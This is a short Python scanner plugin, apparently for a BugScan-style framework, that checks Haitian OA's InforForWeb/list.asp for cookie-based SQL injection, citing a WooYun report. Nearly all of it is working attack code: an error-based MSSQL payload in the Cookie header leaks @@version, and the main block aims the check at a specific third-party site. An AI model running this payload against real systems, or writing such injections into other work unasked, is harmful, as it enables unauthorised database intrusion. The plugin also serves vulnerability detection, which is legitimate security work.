#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 海天OA一处SQL注入
author: yichin
refer: 
    http://www.wooyun.org/bugs/wooyun-2014-087575
description:
    漏了一个
    cookie 注入，事实上有多处，这里用一处做验证
'''

def assign(service, arg):
    if service == 'haitianoa':
        return True, arg

def audit(arg):
    #GET型
    url = arg + 'InforForWeb/list.asp'
    cookie = 'id=1+and+1%3Dconvert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)'
    code, head, res, err, _ = curl.curl2(url, cookie=cookie)
    if ((code == 200) or (code == 500) or (code == 302)) and ('WtFaBcMicrosoft SQL Server' in res):
        security_hole("SQL Injection: " + url + " Cookie:" + cookie)
if __name__ == '__main__':
    from dummy import *
    audit(assign('haitianoa', 'http://www.fzsyxx.com/oa/')[1])
